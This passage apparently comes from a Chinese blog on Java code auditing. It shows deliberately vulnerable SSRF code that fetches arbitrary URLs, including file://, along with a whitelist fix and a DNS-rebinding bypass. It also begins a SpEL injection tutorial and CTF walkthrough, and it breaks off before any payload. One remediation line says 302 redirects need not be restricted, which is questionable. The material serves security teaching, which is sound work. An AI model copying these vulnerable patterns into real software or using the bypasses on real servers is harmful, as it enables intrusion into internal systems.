function_">read</span><span class="hljs-params">(URL url)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">if</span> (url == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;输入内容为空&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">InputStream</span>  <span class="hljs-variable">istream</span> <span class="hljs-operator">=</span> url.openStream();<br>        <span class="hljs-type">ImageInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span>  ImageIO.createImageInputStream(istream);  <span class="hljs-comment">//获取文件</span><br>        <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">bi</span> <span class="hljs-operator">=</span> ImageIO.read(stream);  <span class="hljs-comment">//返回 BufferedImage作为供给的解码结果</span><br>        <span class="hljs-keyword">return</span> bi;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//图片读取</span><br>    <span class="hljs-meta">@GetMapping(&quot;/httpclient&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">downloadImage</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;url&quot;)</span> String imageUrl,</span><br><span class="hljs-params">                              HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-comment">// 设置响应内容类型为PNG图片</span><br>        response.setContentType(<span class="hljs-string">&quot;image/png&quot;</span>);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>             <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream()) &#123;<br>            <span class="hljs-comment">// 从URL读取图片</span><br>            <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(imageUrl);<br>            <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> ImageIO.read(url);<br>            <span class="hljs-keyword">if</span> (image != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// 将图片写入字节数组输出流</span><br>                ImageIO.write(image, <span class="hljs-string">&quot;png&quot;</span>, os);<br>                <span class="hljs-comment">// 将字节数组写入响应输出流</span><br>                <span class="hljs-keyword">try</span> (<span class="hljs-type">InputStream</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(os.toByteArray())) &#123;<br>                    <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>                    <span class="hljs-type">int</span> bytesRead;<br>                    <span class="hljs-keyword">while</span> ((bytesRead = input.read(buffer)) != -<span class="hljs-number">1</span>) &#123;<br>                        outputStream.write(buffer, <span class="hljs-number">0</span>, bytesRead);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="hljs-string">&quot;无法从指定URL获取图片&quot;</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, <span class="hljs-string">&quot;图片处理出错&quot;</span>);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>可以通过https协议访问图片</p><p><img src="/img/ssrf/ss07.png"></p><p>可以通过file协议访问图片，无法访问其他文件。在程序中设置了抛出异常，访问文件时会有error提示</p><p><img src="/img/ssrf/ss08.png"></p><p>若未设置抛出异常，能够看到文件是否存在</p><p>如：</p><p><img src="https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200917061817662-1567997288.png"></p><p><img src="https://img2020.cnblogs.com/blog/1993669/202009/1993669-20200917061828967-1388285250.png"></p><p>如果文件不存在的话会显示找不到指定文件，而存在但文件不为图片文件的话则显示image&#x3D;&#x3D;null。</p><h5 id="HttpClient下的SSRF"><a href="#HttpClient下的SSRF" class="headerlink" title="HttpClient下的SSRF"></a>HttpClient下的SSRF</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">httpClient</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<br><span class="hljs-type">HttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpClient</span>();<br><span class="hljs-type">HttpGet</span> <span class="hljs-variable">getRequest</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);<br><span class="hljs-type">HttpResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> httpClient.execute(getRequest);<br></code></pre></td></tr></table></figure><h5 id="OkHttp-下的SSRF"><a href="#OkHttp-下的SSRF" class="headerlink" title="OkHttp 下的SSRF"></a>OkHttp 下的SSRF</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>.Builder()<br>     .url(<span class="hljs-string">&quot;http://publicobject.com/helloworld.txt&quot;</span>)<br>     .build();<br><br> <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> client.newCall(request).execute();<br></code></pre></td></tr></table></figure><h4 id="白盒规则"><a href="#白盒规则" class="headerlink" title="白盒规则"></a>白盒规则</h4><p>上面的漏洞代码可总结为4种情况：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Author: JoyChou(2017年04月11日)</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* 第一种情况</span><br><span class="hljs-comment"> * Request类</span><br><span class="hljs-comment"> */</span><br>Request.Get(url).execute()<br><br><span class="hljs-comment">/* 第二种情况</span><br><span class="hljs-comment"> * URL类的openStream</span><br><span class="hljs-comment"> */</span><br> URL u;<br> <span class="hljs-type">int</span> length;<br> <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br> u = <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br> inputStream = u.openStream();<br><br><span class="hljs-comment">/* 第三种情况</span><br><span class="hljs-comment"> * HttpClient</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://127.0.0.1&quot;</span>;<br><span class="hljs-type">CloseableHttpClient</span> <span class="hljs-variable">client</span> <span class="hljs-operator">=</span> HttpClients.createDefault();<br><span class="hljs-type">HttpGet</span> <span class="hljs-variable">httpGet</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpGet</span>(url);<br>HttpResponse httpResponse;<br><span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// 该行代码发起网络请求</span><br>    httpResponse = client.execute(httpGet);<br><br><span class="hljs-comment">/* 第四种情况</span><br><span class="hljs-comment"> * URLConnection和HttpURLConnection</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">URLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> url.openConnection();<br><span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">urlConnection</span> <span class="hljs-operator">=</span> url.openConnection();<br></code></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>那么，根据利用的方式，修复方法就比较简单。</p><ul><li>限制协议为HTTP、HTTPS协议。</li><li>禁止URL传入内网IP或者设置URL白名单。</li><li>不用限制302重定向。</li></ul><p>漏洞修复代码如下：</p><p>需要添加guava库(目的是获取一级域名)，在pom.xml中添加</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;dependency&gt;<br>    &lt;groupId&gt;com.google.guava&lt;/groupId&gt;<br>    &lt;artifactId&gt;guava&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">21.0</span>&lt;/version&gt;<br>&lt;/dependency&gt;<br></code></pre></td></tr></table></figure><p>代码的验证逻辑：</p><ol><li>验证协议是否为http或者https</li><li>验证url是否在白名单内</li></ol><p>函数调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] urlwhitelist = &#123;<span class="hljs-string">&quot;joychou.org&quot;</span>, <span class="hljs-string">&quot;joychou.me&quot;</span>&#125;;<br><span class="hljs-keyword">if</span> (!securitySSRFUrlCheck(url, urlwhitelist)) &#123;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>函数验证代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Boolean <span class="hljs-title function_">securitySSRFUrlCheck</span><span class="hljs-params">(String url, String[] urlwhitelist)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url);<br>        <span class="hljs-comment">// 只允许http和https的协议通过</span><br>        <span class="hljs-keyword">if</span> (!u.getProtocol().startsWith(<span class="hljs-string">&quot;http&quot;</span>) &amp;&amp; !u.getProtocol().startsWith(<span class="hljs-string">&quot;https&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>  <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-comment">// 获取域名，并转为小写</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">host</span> <span class="hljs-operator">=</span> u.getHost().toLowerCase();<br>        <span class="hljs-comment">// 获取一级域名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">rootDomain</span> <span class="hljs-operator">=</span> InternetDomainName.from(host).topPrivateDomain().toString();<br><br>        <span class="hljs-keyword">for</span> (String whiteurl: urlwhitelist)&#123;<br>            <span class="hljs-keyword">if</span> (rootDomain.equals(whiteurl)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="DNS-Rebinding-Bypass-SSRF"><a href="#DNS-Rebinding-Bypass-SSRF" class="headerlink" title="DNS Rebinding Bypass SSRF"></a>DNS Rebinding Bypass SSRF</h3><p>详细请看：<a href="https://xz.aliyun.com/news/8300">https://xz.aliyun.com/news/8300</a></p><p>由于我们是用它来绕过SSRF漏洞，所以简单理解就是：当某一个SSRF检测是通过DNS解析后的<code>ip地址</code>来判断是否为安全地址的话，我们可以通过<code>DNS rebinding</code>来进行绕过。</p><h4 id="传统SSRF过滤流程"><a href="#传统SSRF过滤流程" class="headerlink" title="传统SSRF过滤流程"></a>传统SSRF过滤流程</h4><ol><li>获取到输入的URL，从该URL中提取host</li><li>对该host进行DNS解析，获取到解析的IP</li><li>检测该IP是否是合法的，比如是否是私有IP等</li><li>如果IP检测为合法的，则进入curl的阶段发包</li></ol><p>从DNS解析的角度来看，这个过程一共有两次解析，第一次是<code>对该host进行DNS解析</code>，第二次是<code>进入curl的阶段发包</code>，这两次请求之间存在一个时间差，如果我们能够修改DNS地址在第一次请求的时候为合法地址，第二次请求时为恶意地址，就可以绕过这个检测了。</p><h4 id="DNS-Rebinding如何利用？"><a href="#DNS-Rebinding如何利用？" class="headerlink" title="DNS Rebinding如何利用？"></a>DNS Rebinding如何利用？</h4><blockquote><p>攻击者注册一个域名（如attacker.com），并在攻击者控制下将其代理给DNS服务器。 服务器配置为很短响应时间的TTL记录，防止响应被缓存。 当受害者浏览到恶意域时，攻击者的DNS服务器首先用托管恶意客户端代码的服务器的IP地址作出响应。 例如，他们可以将受害者的浏览器指向包含旨在在受害者计算机上执行的恶意JavaScript或Flash脚本的网站。<br>恶意客户端代码会对原始域名（例如attacker.com）进行额外访问。 这些都是由同源政策所允许的。 但是，当受害者的浏览器运行该脚本时，它会为该域创建一个新的DNS请求，并且攻击者会使用新的IP地址进行回复。 例如，他们可以使用内部IP地址或互联网上某个目标的IP地址进行回复。</p></blockquote><p>TTL是一条域名解析记录在DNS服务器中的存留时间。把这个值设置的非常小可以防止DNS解析结果被缓存，进而使得每次获取DNS解析结果是不同的。</p><p>简单理一下这个过程：</p><ol><li>攻击者配置了一台DNS服务器用于解析某域名</li><li>每次请求后返回的解析结果不一样，分别是一个合法地址，一个是恶意地址</li><li>当服务器在第一次请求的时候返回合法地址，第二次请求时返回的是恶意地址。就可以绕过限制进行利用</li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/news/195">SSRF in Java-先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13683023.html">Java 审计之SSRF篇（续） - nice_0e3 - 博客园 (cnblogs.com)</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13682434.html">Java 审计之SSRF篇 - nice_0e3 - 博客园 (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/news/8300">DNS Rebinding Bypass SSRF-先知社区 (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>Java代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
      <tag>漏洞学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计中的SpEL注入</title>
    <link href="/2025/07/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/07/23/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%AD%E7%9A%84SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h3 id="SpEL表达式的功能与使用"><a href="#SpEL表达式的功能与使用" class="headerlink" title="SpEL表达式的功能与使用"></a>SpEL表达式的功能与使用</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><ul><li>访问对象属性：SpEL表达式可以通过对象引用来访问对象的属性，例如${object.property}。</li><li>调用方法：SpEL表达式可以调用对象的方法，例如${object.method()}。</li><li>进行算术运算：SpEL表达式支持各种算术运算符，如加法、减法、乘法和除法。</li><li>进行逻辑运算：SpEL表达式支持逻辑运算符，如与、或、非等。</li><li>进行条件判断：SpEL表达式可以进行条件判断，例如通过if语句判断条件，并执行相应的操作。</li><li>访问集合元素和属性：SpEL表达式可以通过索引或键来访问集合中的元素或对象的属性。</li><li>执行正则表达式匹配：SpEL表达式可以执行正则表达式匹配，并返回匹配结果。</li><li>访问上下文变量和参数：SpEL表达式可以访问上下文中的变量和方法参数。</li><li>进行类型转换：SpEL表达式可以进行类型转换操作，将一个对象转换为另一种类型。</li><li>支持特殊操作符：SpEL表达式支持一些特殊的操作符，如Elvis操作符（?:）、安全导航操作符（?.）等。</li></ul><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><h5 id="表达式"><a href="#表达式" class="headerlink" title="表达式"></a>表达式</h5><p>一般SpEL表达式语法与python语法有些像，此处有详细总结：<a href="https://blog.csdn.net/A_art_xiang/article/details/134370029">Spring-SpEL表达式超级详细使用全解-CSDN博客</a></p><p>这里来看几个较为特殊的用法</p><p>spel语法中的<code>T()</code>操作符 , <code>T()</code>操作符会返回一个object , 它可以帮助我们获取某个类的静态方法 , 用法<code>T(全限定类名).方法名()</code>，后面会用得到</p><p>spel中的<code>#</code>操作符可以用于标记对象，SpEL 表达式可以用 <code>#变量名</code> 的形式访问它们</p><ol><li><p>获取类的类型<br>可以使用特殊的T运算符来指定java.lang.Class的实例(类型)。静态方法也是通过使用这个操作符来调用的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">dateClass</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;T(java.util.Date)&quot;</span>).getValue(Class.class);<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">stringClass</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;T(String)&quot;</span>).getValue(Class.class);<br><br><span class="hljs-type">boolean</span> <span class="hljs-variable">trueValue</span> <span class="hljs-operator">=</span> parser.parseExpression(<br>                <span class="hljs-string">&quot;T(java.math.RoundingMode).CEILING &lt; T(java.math.RoundingMode).FLOOR&quot;</span>)<br>        .getValue(Boolean.class);<br><br></code></pre></td></tr></table></figure></li><li><p>用 <code>#变量名</code> 的形式访问变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">context.setVariable(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-number">10</span>);<br><span class="hljs-type">Integer</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#x + 20&quot;</span>).getValue(context, Integer.class); <span class="hljs-comment">// 结果：30</span><br></code></pre></td></tr></table></figure></li><li><p>表达式模板</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 通常使用#&#123;&#125;作为模板，与字符串拼接起来</span><br><span class="hljs-type">String</span> <span class="hljs-variable">randomPhrase</span> <span class="hljs-operator">=</span> parser.parseExpression(<br>        <span class="hljs-string">&quot;random number is #&#123;T(java.lang.Math).random()&#125;&quot;</span>,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplateParserContext</span>()).getValue(String.class);<br><br><span class="hljs-comment">// evaluates to &quot;random number is 0.7038186818312008&quot;</span><br><br></code></pre></td></tr></table></figure><p>或者找到源码中定义的地方</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TemplateParserContext 的定义</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplateParserContext</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ParserContext</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExpressionPrefix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;#&#123;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getExpressionSuffix</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isTemplate</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h5 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h5><p>SpEL调用流程 : 1.新建解析器 2.解析表达式 3.注册变量(可省,在取值之前注册) 4.取值</p><p>示例1:不注册新变量的用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br><span class="hljs-type">Expression</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;&#x27;Hello World&#x27;.concat(&#x27;!&#x27;)&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>System.out.println( exp.getValue() );<span class="hljs-comment">//取值，Hello World！</span><br></code></pre></td></tr></table></figure><p>示例2:自定义注册加载变量的用法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spel</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;何止&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Spel</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Spel</span>();<br>        StandardEvaluationContext context=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StandardEvaluationContext</span>();<br>        context.setVariable(<span class="hljs-string">&quot;user&quot;</span>,user);<span class="hljs-comment">//通过StandardEvaluationContext注册自定义变量</span><br>        <span class="hljs-type">SpelExpressionParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpelExpressionParser</span>();<span class="hljs-comment">//创建解析器</span><br>        <span class="hljs-type">Expression</span> <span class="hljs-variable">expression</span> <span class="hljs-operator">=</span> parser.parseExpression(<span class="hljs-string">&quot;#user.name&quot;</span>);<span class="hljs-comment">//解析表达式</span><br>        System.out.println( expression.getValue(context).toString() );<span class="hljs-comment">//取值,输出何止</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="SpEL表达式注入攻击"><a href="#SpEL表达式注入攻击" class="headerlink" title="SpEL表达式注入攻击"></a>SpEL表达式注入攻击</h3><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/89d8d5cfac7a40b9bb61835a5fd9b5f4~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp"></p><h4 id="攻击条件-敏感函数"><a href="#攻击条件-敏感函数" class="headerlink" title="攻击条件(敏感函数)"></a>攻击条件(敏感函数)</h4><ol><li>使用StandardEvaluationContext，</li><li>未对输入的SpEL进行校验，或有方法绕过</li><li>对表达式调用了getValue()或parseExpression()函数或getAdvanceValue函数。</li></ol><h4 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h4><ul><li>getValue()，parseExpression()，getAdvanceValue()</li><li>StandardEvaluationContext()，ExpressionParser()，SpelExpressionParser()</li></ul><h4 id="Code-Breaking-javacon"><a href="#Code-Breaking-javacon" class="headerlink" title="Code-Breaking javacon"></a>Code-Breaking javacon</h4><p>下载源码</p><p><a href="https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar">https://www.leavesongs.com/media/attachment/2018/11/23/challenge-0.0.1-SNAPSHOT.jar</a></p><p>使用命令运行环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar C:\Users\86177\Desktop\challenge-0.0.1-SNAPSHOT.jar<br></code></pre></td></tr></table></figure><p>使用JD-GUI反编译(直接用IDEA反编译是不成功的)，导出后用IDEA打开</p><p>查看目录结构以及application.yml文件</p><p><img src="/img/spel/s01.png"></p><p>可以看到是有spel表达式调用的，但是也有黑名单</p><p>查看MainController文件</p><p>可以看到getAdvanceValue函数(动态解析用户输入的 Spring 表达式（SpEL）并返回执行结果，它在解析前会对输入内容做黑名单关键词过滤，阻止执行危险表达式)，此函数是SpELl注入漏洞出发点</p><p><img src="/img/spel/s02.png"></p><p>搜索关键字getAdvanceValue</p><p>可以看到admin方法中若rememberMeValue不为空，则会将此值做解密处理，将获得的值作为username属性</p><p>此时的username可控，可以实现SpEL注入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping</span><br><span class="hljs-comment">/*     */</span>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">admin</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(value = &quot;remember-me&quot;, required = false)</span> String rememberMeValue, HttpSession session, Model model)</span> &#123;<br><span class="hljs-comment">/*  36 */</span>     <span class="hljs-keyword">if</span> (rememberMeValue != <span class="hljs-literal">null</span> &amp;&amp; !rememberMeValue.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br><span class="hljs-comment">/*  37 */</span>       <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.userConfig.decryptRememberMe(rememberMeValue);<br><span class="hljs-comment">/*  38 */</span>       <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-comment">/*  39 */</span>         session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, str);<br><span class="hljs-comment">/*     */</span>       &#125;<br><span class="hljs-comment">/*     */</span>     &#125; <br><span 